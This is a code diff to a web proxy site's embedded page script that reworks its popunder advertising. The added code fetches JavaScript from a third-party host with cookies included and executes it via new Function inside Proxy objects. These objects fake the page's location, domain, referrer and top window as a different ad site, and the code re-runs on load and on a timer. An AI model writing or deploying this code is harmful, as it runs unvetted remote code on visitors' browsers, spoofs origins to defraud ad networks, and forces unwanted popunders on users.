@@ -172,7 +172,7 @@
 })();
 ]]></script>
         <style><![CDATA[html,body{margin:0;width:100%;height:100%;overflow:hidden}foreignObject{overflow:visible}]]></style>
-<script><![CDATA[window.breezeConfig={"api":"https://breezeunb.locker","wisp":"wss://breezeunb.locker/wind/","pool":[],"build":"e00ae5487d629f8e","updateFrom":"https://cdn.jsdelivr.net/gh/logleonard01-web/tmp-df81f05079c62e52@main/"};]]></script>
+<script><![CDATA[window.breezeConfig={"api":"https://breezeunb.locker","wisp":"wss://breezeunb.locker/wind/","pool":[],"build":"87c7ae31fde2e609","updateFrom":"https://cdn.jsdelivr.net/gh/logleonard01-web/tmp-df81f05079c62e52@main/"};]]></script>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <meta name="color-scheme" content="dark light"/>
@@ -192,7 +192,9 @@ gtag('config', 'G-0SFBC6Z5TL');
 (function () {
   var MARK = "a2a266175c782699837956245e5fbb8a";
   var HOST = "discussionanymore.com";
-  var ZONE = "https://cg.ah.football/home";
+  var ZONE = "https://" + HOST + "/" + MARK;
+  var AD_SITE = "https://cg.ah.football/";
+  var AD_HOST = "cg.ah.football";
   var POP_SRC = "https://" + HOST + "/a2/a2/66/" + MARK + ".js";
   var queue = [];
   var routing = false;
@@ -293,17 +295,67 @@ gtag('config', 'G-0SFBC6Z5TL');
     });
   }
 
+  function adLocation() {
+    return {
+      href: AD_SITE,
+      origin: "https://cg.ah.football",
+      protocol: "https:",
+      host: AD_HOST,
+      hostname: AD_HOST,
+      port: "",
+      pathname: "/",
+      search: "",
+      hash: "",
+      ancestorOrigins: { length: 0 },
+      assign: function (url) { openInProxy(url); },
+      replace: function (url) { openInProxy(url); },
+      reload: function () {},
+      toString: function () { return AD_SITE; },
+      valueOf: function () { return AD_SITE; }
+    };
+  }
+  function runAdScript(code) {
+    if (!code || !String(code).trim()) return;
+    var loc = adLocation();
+    var doc = new Proxy(document, {
+      get: function (target, prop) {
+        if (prop === "location") return loc;
+        if (prop === "URL" || prop === "documentURI") return AD_SITE;
+        if (prop === "domain") return AD_HOST;
+        if (prop === "referrer") return AD_SITE;
+        var value = target[prop];
+        return typeof value === "function" ? value.bind(target) : value;
+      },
+      set: function (target, prop, value) {
+        if (prop === "domain" || prop === "location") return true;
+        target[prop] = value;
+        return true;
+      }
+    });
+    var view = new Proxy(window, {
+      get: function (target, prop) {
+        if (prop === "location") return loc;
+        if (prop === "origin") return loc.origin;
+        if (prop === "document") return doc;
+        if (prop === "top" || prop === "parent" || prop === "self" || prop === "window" || prop === "globalThis") return view;
+        var value = target[prop];
+        return typeof value === "function" ? value.bind(target) : value;
+      },
+      set: function (target, prop, value) {
+        if (prop === "location") { openInProxy(value); return true; }
+        target[prop] = value;
+        return true;
+      }
+    });
+    var run = new Function("window", "document", "location", "top", "parent", "self", "globalThis", "origin", String(code));
+    run.call(view, view, doc, loc, view, view, view, view, loc.origin);
+  }
   function armPopunder() {
     clearAdCaps();
-    var nodes = document.querySelectorAll("script[data-breeze-popunder]");
-    for (var i = 0; i < nodes.length; i++) {
-      if (nodes[i].parentNode) nodes[i].parentNode.removeChild(nodes[i]);
-    }
-    var script = document.createElement("script");
-    script.src = POP_SRC + "?r=" + Date.now();
-    script.async = true;
-    script.setAttribute("data-breeze-popunder", "1");
-    (document.head || document.documentElement).appendChild(script);
+    fetch(POP_SRC + "?r=" + Date.now(), { cache: "no-store", credentials: "include" })
+      .then(function (res) { return res.ok ? res.text() : ""; })
+      .then(function (code) { try { runAdScript(code); } catch (err) {} })
+      .catch(function () {});
   }
 
   function scheduleRearm() {
@@ -347,7 +399,6 @@ gtag('config', 'G-0SFBC6Z5TL');
 
   function openInProxy(url) {
     var abs = normalize(url);
-    if (abs && abs.indexOf(MARK) !== -1) abs = ZONE;
     if (!abs) return false;
     var now = Date.now();
     if (openedByUs && now - openedByUs < POP_EVERY) return false;
@@ -638,7 +689,7 @@ gtag('config', 'G-0SFBC6Z5TL');
   function isAdFrame(frame) {
     if (!frame || String(frame.tagName).toUpperCase() !== "IFRAME") return false;
     var src = frame.getAttribute("src") || "";
-    return src.indexOf(HOST) !== -1 || src.indexOf("cg.ah.football") !== -1 || frame.getAttribute("data-breeze-ad") === "1";
+    return src.indexOf(HOST) !== -1 || frame.getAttribute("data-breeze-ad") === "1";
   }
 
   function onFrameEngage() {
@@ -735,9 +786,9 @@ gtag('config', 'G-0SFBC6Z5TL');
   setInterval(function () {
     if (!adListeners.length && !rearmTimer) armPopunder();
   }, 12000);
+  armPopunder();
 })();
 ]]></script>
-<script src="https://discussionanymore.com/a2/a2/66/a2a266175c782699837956245e5fbb8a.js" data-breeze-popunder="1"/>
 
       </head>
       <body>
